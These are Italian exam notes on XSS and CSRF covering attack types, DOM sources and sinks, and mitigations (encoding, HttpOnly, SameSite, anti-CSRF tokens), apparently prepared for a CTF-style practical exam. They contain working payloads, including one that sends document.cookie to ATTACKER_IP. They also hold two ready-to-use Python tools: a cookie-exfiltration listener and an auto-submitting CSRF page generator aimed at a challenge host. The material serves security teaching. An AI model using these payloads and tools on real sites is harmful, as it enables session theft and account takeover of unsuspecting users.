# Appunti d'Esame: Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)

Questo modulo raccoglie ed elabora in modo discorsivo e tecnico le slide e le nozioni fondamentali relative alla sicurezza client-side, analizzando nel dettaglio due delle vulnerabilità più famose del web: **Cross-Site Scripting (XSS)** e **Cross-Site Request Forgery (CSRF)**.

Gli appunti seguono rigidamente la struttura concordata: inquadramento concettuale, preambolo sul funzionamento e approfondimento tecnico-operativo, senza alcun riferimento numerico per facilitare una lettura fluida e immediata.

---

## Modulo 1: Cross-Site Scripting (XSS)

### 1. Inquadramento Concettuale e Discorsivo
La vulnerabilità di **Cross-Site Scripting (XSS)** fa parte della grande famiglia delle iniezioni di codice. La sua particolarità risiede nel fatto che, a differenza delle SQL o delle Command Injection (che colpiscono direttamente il server host), **l'XSS colpisce il client**, ovvero il browser dell'utente vittima che visita il sito compromesso.

L'attacco si verifica quando un'applicazione web include dati non controllati (input utente) all'interno di una pagina web generata, senza averli preventivamente sanificati o codificati. Quando il browser della vittima riceve la pagina dal server, interpreta l'input malevolo non come semplice testo o dati da mostrare, ma come **codice JavaScript legittimo da eseguire**. 

Poiché il codice JavaScript gira nel contesto del browser della vittima, esso eredita tutti i privilegi della vittima stessa su quel particolare sito. Le conseguenze d'esame e reali più comuni sono:
*   **Sottrazione dei cookie di sessione:** Attraverso l'accesso alla proprietà di sistema `document.cookie`, l'attaccante può estrarre il token di sessione della vittima e inviarlo a un server esterno controllato, ottenendo così l'accesso immediato all'account senza conoscere le credenziali.
*   **Azioni per conto della vittima:** Eseguire silenziosamente chiamate API (es. cambiare l'email del profilo, inviare messaggi, pubblicare post).
*   **Sottrazione di informazioni sensibili:** Leggere dati visualizzati sulla pagina (es. dettagli di pagamento, codici personali) o catturare i tasti premuti sulla tastiera (Keylogging).

---

### 2. Preambolo sul Funzionamento (La Triade delle XSS)
Per comprendere come avvenga l'iniezione, dobbiamo distinguere le tre tipologie principali di XSS, focalizzandoci su come l'input maligno compia il suo percorso prima di essere interpretato dal browser.

*   **Reflected XSS (XSS Riflessa):** È la tipologia più comune. Si verifica quando il server prende un valore ricevuto in una variabile HTTP (ad esempio un parametro in GET o POST) e lo "riflette" (lo stampa) direttamente nel corpo della risposta HTML senza alcun controllo. 
    *   *La logica:* L'attaccante deve convincere la vittima a cliccare su un link appositamente contraffatto (es. via phishing o messaggi) che contiene il payload JavaScript nel parametro vulnerabile. Non appena la vittima clicca, la richiesta parte, il server inserisce il payload nella pagina e lo restituisce al browser della vittima, che lo esegue.
*   **Stored XSS (XSS Persistente):** È la variante più pericolosa perché non richiede che la vittima clicchi su un link personalizzato. Il payload non viene semplicemente riflesso al volo, ma viene **salvato permanentemente** dall'applicazione (ad esempio in un database, in un file di log, o in una sezione commenti).
    *   *La logica:* L'attaccante inserisce il payload una volta sola. Da quel momento in poi, chiunque visiti la pagina che mostra quel dato (es. leggendo la bacheca di un forum o i commenti di un blog) riceverà il codice JavaScript maligno dal database ed eseguirà l'attacco in modo completamente trasparente e automatico.
*   **DOM-Based XSS:** In questo caso, il server backend non è minimamente coinvolto nella visualizzazione o nel riflesso del payload. L'intera iniezione avviene esclusivamente sul client tramite gli script JavaScript già presenti sulla pagina.
    *   *La logica:* Lo script JavaScript legittimo della pagina prende un input controllato dall'utente (es. l'ancora dell'URL dopo il carattere `#` o i parametri di ricerca nel browser) e lo passa in modo non sicuro a una funzione JavaScript in grado di alterare il DOM (Document Object Model) o di valutare codice.

---

### 3. Approfondimento Tecnico Operativo

#### Sinks e Sources comuni in DOM-Based XSS
Per scovare o analizzare una DOM-Based XSS in modalità WhiteBox o analizzando il codice sorgente del browser, occorre tracciare il flusso dei dati da una **Source** (sorgente di input) a un **Sink** (punto di esecuzione vulnerabile):

*   **Sources (Sorgenti controllabili dall'utente):**
    *   `location.search` (i parametri dell'URL dopo il `?`)
    *   `location.hash` (i parametri dopo il `#`, molto utili perché spesso non vengono nemmeno inviati al server backend)
    *   `document.referrer` (l'URL della pagina precedente)
    *   `window.name`
*   **Sinks (Funzioni o proprietà pericolose):**
    *   *Sinks di esecuzione:* `eval()`, `setTimeout()`, `setInterval()`.
    *   *Sinks di manipolazione HTML:* `element.innerHTML`, `document.write()`, `document.writeln()`. Se l'input utente finisce qui dentro senza codifica, il browser interpreterà i tag HTML e `<script>` presenti nell'input.
    *   *Proprietà sicure alternative:* Per prevenire questo problema, gli sviluppatori dovrebbero usare proprietà sicure come `element.textContent` o `element.innerText`, che trattano qualsiasi input strettamente come testo letterale, neutralizzando i tag di script.

#### Payload Tipici per l'Esame (e Bypasses comuni)
1.  **Payload Standard con Script Tag:**
    ```html
    <script>alert(1)</script>
    ```
2.  **Payload con tag Immagine (se `<script>` è filtrato o bloccato):**
    Si forza il caricamento di un'immagine inesistente e si cattura l'evento di errore (`onerror`) per eseguire il codice JavaScript.
    ```html
    <img src="x" onerror="alert(1)">
    ```
3.  **Sottrazione del Cookie (Payload CTF classico):**
    Il payload invia il cookie di sessione della vittima verso un server controllato dall'attaccante (es. un listener Python o un webhook).
    ```html
    <img src="x" onerror="fetch('http://ATTACKER_IP:8000/?cookie=' + btoa(document.cookie))">
    ```
    *Nota: `btoa()` codifica il cookie in Base64 per evitare che caratteri speciali rompano la richiesta HTTP.*

#### Tecniche di Mitigazione
*   **HTML Encoding (Sanitizzazione):** Convertire i caratteri HTML sensibili nelle rispettive entità HTML prima di stampare l'input nella pagina. I caratteri fondamentali da convertire sono:
    *   `<` diventa `&lt;`
    *   `>` diventa `&gt;`
    *   `"` diventa `&quot;`
    *   `'` diventa `&#x27;`
    *   `&` diventa `&amp;`
    In PHP, la funzione standard di sanificazione è `htmlspecialchars()`.
*   **Uso di Template Engine:** Framework come Jinja2 (Python), Blade (Laravel) o Twig integrano la sanificazione automatica e l'HTML encoding di default per ogni placeholder (es. `{{ user_input }}`).
*   **Flag HttpOnly sui Cookie:** È la difesa più robusta contro il furto di sessione via XSS. Configurando il cookie di sessione con la flag `HttpOnly`, si impedisce a qualsiasi script JavaScript (compresi quelli iniettati via XSS) di accedere alla proprietà `document.cookie`. Il browser continuerà a inviare il cookie automaticamente nelle richieste HTTP, ma esso sarà invisibile agli script sul client.

---

## Modulo 2: Cross-Site Request Forgery (CSRF)

### 1. Inquadramento Concettuale e Discorsivo
La vulnerabilità di **Cross-Site Request Forgery (CSRF)** si basa su una caratteristica fondamentale dei browser web e sulla natura "stateless" del protocollo HTTP. 

Quando un utente si autentica su un sito web (es. la sua banca online `bank.site`), il server rilascia un cookie di sessione. Da quel momento in poi, **il browser dell'utente allegherà automaticamente quel cookie di sessione a qualsiasi richiesta inviata verso `bank.site`**, al fine di dimostrare l'autenticazione.

Il CSRF abusa di questo automatismo. Si tratta di un attacco in cui un sito web malevolo (es. `attacker.site`), visitato dall'utente autenticato, **forza il browser della vittima a inviare una richiesta HTTP non voluta e dannosa verso il sito fidato** (`bank.site`). Poiché la richiesta parte dal browser dell'utente, essa conterrà automaticamente i cookie di sessione legittimi. Per il server di `bank.site`, la richiesta apparirà del tutto autentica ed autorizzata, ed eseguirà l'azione (es. trasferire denaro, cambiare password) per conto dell'attaccante.

La differenza chiave con l'XSS è importante:
*   In un **XSS**, l'attaccante esegue codice *dentro* il sito vulnerabile (può leggere la pagina, estrarre dati, rubare cookie).
*   In un **CSRF**, l'attaccante agisce *da un sito esterno* e induce il browser a fare una richiesta cieca (non può leggere la risposta a causa delle barriere di sicurezza del browser, ma può forzare il compimento di azioni).

---

### 2. Preambolo sul Funzionamento (La transazione malevola)
Immaginiamo che il pannello amministrativo di un sito consenta di cambiare la password dell'utente tramite una richiesta GET strutturata in questo modo:
`http://vulnerable.site/profile/change_password?new_pass=admin123`

Se l'amministratore del sito è attualmente loggato e, mantenendo aperta la sessione, visita una pagina web controllata dall'attaccante, quest'ultima può contenere un tag HTML invisibile del tipo:
```html
<img src="http://vulnerable.site/profile/change_password?new_pass=hacked_pass" width="0" height="0">
```
Il browser dell'amministratore, nel tentativo di caricare l'immagine invisibile, effettuerà in background una richiesta GET verso `vulnerable.site`, allegando automaticamente il cookie di sessione dell'amministratore. La password verrà cambiata immediatamente senza alcuna interazione o avviso visibile.

Se l'azione richiede una richiesta POST (es. tramite un form), il meccanismo è analogo: il sito dell'attaccante ospiterà un form HTML nascosto pre-popolato con i dati d'attacco e utilizzerà poche righe di JavaScript per inviarlo automaticamente (`form.submit()`) non appena la pagina viene caricata.

---

### 3. Approfondimento Tecnico Operativo

#### Le Difese Cruciali (La barra protettiva)

##### A. SameSite Cookie Attribute (Introdotto nel 2018)
È la mitigazione più moderna ed efficace integrata direttamente nei browser. Consente di definire in quali contesti inter-sito (cross-site) un cookie deve essere allegato alle richieste. Il flag può assumere tre valori:
1.  **Strict:** Il cookie non viene **mai** inviato in richieste cross-site. Se l'utente clicca su un link che punta a `bank.site` partendo da `facebook.com`, il cookie non viene inviato (l'utente apparirà non loggato sul target). Questa impostazione blocca totalmente il CSRF.
2.  **Lax:** È il comportamento di default moderno nei browser. I cookie non vengono inviati per richieste cross-site secondarie (come il caricamento di immagini, fogli di stile o richieste API in background via script), ma **vengono inviati quando l'utente effettua una navigazione di primo livello** (es. cliccando su un link standard `<a>` o inserendo l'URL direttamente nella barra degli indirizzi).
3.  **None:** I cookie vengono inviati sempre, in qualsiasi contesto cross-site (comportamento storico legacy). Richiede obbligatoriamente che il cookie sia impostato anche con la flag `Secure` (trasmesso solo su HTTPS).

##### B. Anti-CSRF Tokens (I Token di Sincronizzazione)
Consiste nell'inserire un valore casuale, univoco e crittograficamente sicuro (il token) all'interno di ogni form sensibile generato dal server. Questo token viene salvato anche nella sessione dell'utente sul server.
*   Quando l'utente invia il form, il server verifica che il token ricevuto corrisponda a quello salvato in sessione. Se non corrisponde o manca, la richiesta viene respinta.
*   **Perché funziona?** Questa difesa si basa sulla **Same-Origin Policy (SOP)** del browser. Un sito web esterno controllato dall'attaccante (`attacker.site`) non può leggere il codice HTML o la sessione di `bank.site` per recuperare il valore del token. Di conseguenza, l'attaccante non potrà mai pre-popolare il form nascosto con il token corretto, rendendo l'exploit CSRF inefficace.

---

## Modulo 3: Script d'Automazione per la tua Chiavetta USB

Di seguito sono riportati i due script Python fondamentali da tenere pronti per l'esame pratico.

### Script 1: XSS Cookie Grabber / Exfiltration Receiver
Questo script avvia un server web HTTP minimale e pulito sulla tua macchina d'attacco. È progettato specificamente per ricevere ed esfiltrare i cookie (o altre informazioni sensibili) inviati dai tuoi payload XSS, provvedendo a decodificarli in tempo reale se inviati in formato Base64.

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import base64
import sys

# Porta locale su cui far girare il listener sulla macchina d'attacco
PORT = 8000

class CookieGrabberHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Gestisce la ricezione dei dati esfiltrati via richiesta GET"""
        parsed_url = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        print(f"\n[+] Connessione ricevuta da: {self.client_address[0]}")
        print(f"[*] Path richiesto: {self.path}")
        
        # Se nel payload XSS abbiamo usato il parametro ?cookie=...
        if 'cookie' in query_params:
            raw_cookie = query_params['cookie'][0]
            print(f"[!] DATO ESFILTRATO RILEVATO: {raw_cookie}")
            
            # Tentativo di decodifica automatica da Base64 (utile se abbiamo usato btoa() nel payload)
            try:
                decoded_cookie = base64.b64decode(raw_cookie).decode('utf-8')
                print(f"[+++] COOKIE DECODIFICATO: {decoded_cookie}")
            except Exception:
                print("[*] Il dato non è in formato Base64 o non è stato decodificato correttamente.")
                
        # Invia una risposta HTTP di successo fittizia per non insospettire o bloccare la vittima
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*") # Consente richieste cross-origin
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        """Gestisce la ricezione dei dati via POST (es. se usiamo fetch con metodo POST)"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print(f"\n[+] Connessione ricevuta via POST da: {self.client_address[0]}")
        print(f"[!] DATO POST RILEVATO: {post_data}")
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # Silenzia i log di accesso di default per mantenere l'output pulito d'esame
        return

def main():
    print(f"[*] Avvio XSS Cookie Grabber sulla porta {PORT}...")
    print(f"[*] Payload consigliato per l'esame:")
    print(f"    <img src=\"x\" onerror=\"fetch('http://TUO_IP:{PORT}/?cookie=' + btoa(document.cookie))\">")
    print("[-] In attesa di connessioni... premi CTRL+C per interrompere")
    
    server_address = ('', PORT)
    try:
        httpd = HTTPServer(server_address, CookieGrabberHandler)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[-] Arresto del server receiver in corso...")
        sys.exit(0)

if __name__ == "__main__":
    main()
```

### Script 2: CSRF Exploit Page Generator
Questo script automatizza la generazione di un file HTML di attacco CSRF. Configurando i parametri dell'azione vulnerabile (URL, campi del form, ecc.), lo script genera una pagina HTML pulita che, non appena caricata nel browser della vittima, sottomette automaticamente un form nascosto tramite JavaScript effettuando la richiesta POST malevola.

```python
#!/usr/bin/env python3
import sys

# Configurazione dell'exploit d'esame
TARGET_ACTION_URL = "http://shops.challs.olicyber.it/profile/change_email" # Endpoint POST vulnerabile
EXPLOIT_FILENAME = "csrf_exploit.html" # File HTML di output generato

# Campi del form con i relativi valori d'attacco da forzare
FORM_FIELDS = {
    "email": "attaccante@evil.it",
    "submit": "Invia"
}

def generate_csrf_exploit():
    """Genera una pagina HTML con form auto-submittante per sfruttare una CSRF POST"""
    
    # Costruiamo dinamicamente gli input nascosti
    hidden_inputs = ""
    for name, value in FORM_FIELDS.items():
        hidden_inputs += f'      <input type="hidden" name="{name}" value="{value}" />\n'
        
    html_template = f"""<!DOCTYPE html>
<html>
  <head>
    <title>Attacco in Corso...</title>
  </head>
  <body>
    <!-- Pagina civetta o messaggio d'attesa per non insospettire -->
    <h2>Caricamento della risorsa in corso... Attendere prego.</h2>
    
    <!-- Form d'attacco nascosto -->
    <form id="csrfForm" action="{TARGET_ACTION_URL}" method="POST">
{hidden_inputs}    </form>

    <script>
      // Sottomette automaticamente il form non appena la pagina viene caricata nel browser
      window.onload = function() {{
          document.getElementById('csrfForm').submit();
      }};
    </script>
  </body>
</html>
"""
    
    try:
        with open(EXPLOIT_FILENAME, "w", encoding="utf-8") as f:
            f.write(html_template)
        print(f"[+] Exploit CSRF generato con successo!")
        print(f"[+] Salvato in locale come: '{EXPLOIT_FILENAME}'")
        print(f"[*] Come usarlo all'esame:")
        print(f"    1. Avvia un server web nella cartella dell'exploit: 'php -S 0.0.0.0:8080'")
        print(f"    2. Invia l'URL http://TUO_IP:8080/{EXPLOIT_FILENAME} al bot/vittima dell'esame.")
    except Exception as e:
        print(f"[-] Errore nella generazione dell'exploit: {e}")

if __name__ == "__main__":
    generate_csrf_exploit()
```
